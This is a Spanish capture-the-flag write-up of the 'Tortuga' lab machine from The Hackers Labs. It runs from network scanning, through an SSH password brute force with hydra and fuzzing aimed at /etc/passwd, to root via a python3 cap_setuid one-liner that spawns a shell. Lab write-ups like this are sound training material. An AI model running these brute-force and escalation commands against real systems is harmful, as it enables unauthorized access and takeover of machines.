- Tags: #tortuga
---
# Writeup Template: Maquina `[ Tortuga ]`

- Tags: #tortuga 
- Dificultad: `[ Facil ]`
- Plataforma: `[ The Hackers Labs ]`

---
## Configuracion del Entorno
**Nota:** Pagina oficcioal donde descargo los laboratorios: [The Hackers Labs](https://labs.thehackerslabs.com/)
- Descargamos el archivo **( .ova )**
- Descomprimimos el archivo **zip**
- Importamos el **ova** en **virtualBox**

---
## Fase de Reconocimiento

### Direccion IP del Target
Realizamos el reconocimiento del objetivo
```bash
sudo arp-scan -I wlan0 --localnet --ignoredups

192.168.100.23  08:00:27:fe:93:04       PCS Systemtechnik GmbH
```
### Identificación del Target
Lanzamos una traza **ICMP** para determinar si tenemos conectividad con el target
```bash
ping -c 1 192.168.100.23
```

### Determinacion del SO
Usamos nuestra herramienta en python para determinar ante que tipo de sistema opertivo nos estamos enfrentando
```bash
wichSystem.py 192.168.100.23
# TTL: [ 64 ] -> [ Linux ]
```

---
## Enumeracion de Puertos y Servicios
### Descubrimiento de Puertos
```bash
# Escaneo rápido con herramienta personalizada en python
escanerTCP.py -t 192.168.100.23 -p 1-65000

# Escaneo con Nmap
nmap -p- -sS --open --min-rate 5000 -vvv -n -Pn 192.168.100.23 -oG allPorts
extractPorts allPorts # Parseamos la informacion mas relevante del primer escaneo
```

### Análisis de Servicios
Realizamos un escaneo exhaustivo para determinar los servicios y las versiones que corren detreas de estos puertos
```bash
nmap -sCV -p22,80,6466,6553,7878,8008,8009,8443,9000,16090,35031,37191,38235,39301,44459,44642,45947,65433 192.168.100.23 -oN targeted
```

**Servicios identificados:**
```bash
22/tcp    open   ssh        OpenSSH 9.2p1 Debian 2+deb12u7 (protocol 2.0)
80/tcp    open   http       Apache httpd 2.4.62 ((Debian Oracular))
6466/tcp  closed unknown
6553/tcp  closed unknown
7878/tcp  closed owms
8008/tcp  closed http
8009/tcp  closed ajp13
8443/tcp  closed https-alt
9000/tcp  closed cslistener
16090/tcp closed unknown
35031/tcp closed unknown
37191/tcp closed unknown
38235/tcp closed unknown
39301/tcp closed unknown
44459/tcp closed unknown
44642/tcp closed unknown
45947/tcp closed unknown
65433/tcp closed unknown
```
---

## Enumeracion de [Servicio Web Principal]
direccion **URL** del servicio:
```bash
http://192.168.100.23
```
### Tecnologías Detectadas
Realizamos deteccion de las tecnologias empleadas por la web
```bash
whatweb http://192.168.100.23/
http://192.168.100.23/ [200 OK] Apache[2.4.62], Country[RESERVED][ZZ], HTML5, HTTPServer[Debian Linux][Apache/2.4.62 (Debian)], IP[192.168.100.23], Title[Isla Tortuga]
```
### Descubrimiento de Archivos y Rutas
```bash
gobuster dir --no-error -u http://192.168.100.23 -w /usr/share/SecLists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt -t 50 -x php,php.back,backup,txt,sh,html,js,java,py
```

- **Hallazgos**:
```bash
/mapa.php (Status: 200)
/tripulacion.php (Status: 200) 
```

---
## Explotacion de Vulnerabilidades
### Vector de Ataque
Tenemos dos archivos php a los cuales realizamos fuzzing de parametros validos para ese archivo:
Realizamos fuerza bruta
```bash
wfuzz -c -t 200 -w /usr/share/SecLists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt -u "http://192.168.100.23/mapa.php?FUZZ=/etc/passwd" --hh=922 
wfuzz -c -t 200 -w /usr/share/SecLists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt -u "http://192.168.100.23/tripulacion.php?FUZZ=/etc/passwd" --hh=979
```

**Nota** no encontramos ningun parametro valido
### Ejecucion del Ataque
En la ruta de:
```http
http://192.168.100.23/mapa.php
```

Tenemos un potencial usuario valido para el sistema:
```bash
Una nota arrugada se lee en la esquina del mapa...
"Ey **grumete** revisa la nota oculta que dejado en tu camarote..."
```

Procedemos a realizar un ataque de fuerza bruta por **ssh**, bajo el usuario **grumete**
```bash
# Comandos para explotación
hydra -l grumete -P /usr/share/wordlists/rockyou.txt -f -t 4 ssh://192.168.100.23
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
```

Obtenemnos las credenciales validas para este usuario:
```bash
[STATUS] 64.53 tries/min, 968 tries in 00:15h, 14343431 to do in 3704:24h, 4 active
[22][ssh] host: 192.168.100.23   login: grumete   password: 1234
```
### Intrusion
Nos conectamos por ssh
```bash
# Reverse shell o acceso inicial
ssh grumete@192.168.100.23 # 1234
```

---

## Escalada de Privilegios
### Enumeracion del Sistema
```bash
# Enumeracion de usuarios del sistema:
cat /etc/passwd | grep "sh"

root:x:0:0:root:/root:/bin/bash
capitan:x:1001:1001::/home/capitan:/bin/bash
grumete:x:1002:1002::/home/grumete:/bin/bash
```
### Explotacion de Privilegios

###### Usuario `[ Grumete ]`:
Tenemso la flag de usuario
```bash
-r-------- 1 grumete grumete   33 sep  5 11:55 user.txt
```

Tenemos un archivo oculto en el directorio de este usuario:
```bash
-rw-r--r-- 1 root    root     791 sep  5 13:23 .nota.txt
```

Revisamos su contenido:
```txt
grumete@TheHackersLabs-Tortuga:~$ cat .nota.txt 
Querido grumete,

Parto rumbo a la isla vecina por asuntos que no pueden esperar, estaré fuera un par de días. 
Mientras tanto, confío en ti para que cuides del barco y de la tripulación como si fueran míos. 

La puerta de la cámara del timón está asegurada con la contraseña: 
    "mar_de_fuego123"  

Recuerda, no se la reveles a nadie más. Has demostrado ser leal y firme durante todos estos años 
navegando juntos, y eres en quien más confío en estos mares traicioneros.

Mantén la guardia alta, vigila las provisiones y cuida de que ningún intruso ponga un pie en cubierta.  
Cuando regrese, espero encontrar el barco tal y como lo dejo hoy (¡y nada de usar la bodega de ron 
para hacer carreras de tortugas otra vez!).  

Con la confianza de siempre,  
— El Capitán
```

Tenemos una potencial password que usaremos para conectarnos como el usuario **capitan**
```bash
su capitan # mar_de_fuego123
```
###### Usuario `[ Capitan ]`:
Para este usuario tenemos capabilities abilitadas en el binario de **python3**
```bash
getcap -r / 2>/dev/null
```

Binario con **Capabilitie**
```bash
/usr/bin/python3.11 cap_setuid=ep
```

Si podemos controlar el **ID** importando la libreria **os**, si como **output** vemos **root**, ya podemso ganar acceso como **root**
```bash
capitan@TheHackersLabs-Tortuga:~$ /usr/bin/python3.11 -c 'import os; os.setuid(0); os.system("whoami")'
root
```

Ahora solo nos queda ganar acceso como root
```bash
# Comando para escalar al usuario: ( root )
capitan@TheHackersLabs-Tortuga:~$ /usr/bin/python3.11 -c 'import os; os.setuid(0); os.system("/bin/bash")'
```
---
## Evidencia de Compromiso
Flag de **root**
```bash
-r--------  1 root root   33 sep  5 11:55 root.txt
```

```bash
# Captura de pantalla o output final
root@TheHackersLabs-Tortuga:~# echo -e "\n[+] Hacked: $(whoami)\n"

[+] Hacked: root
```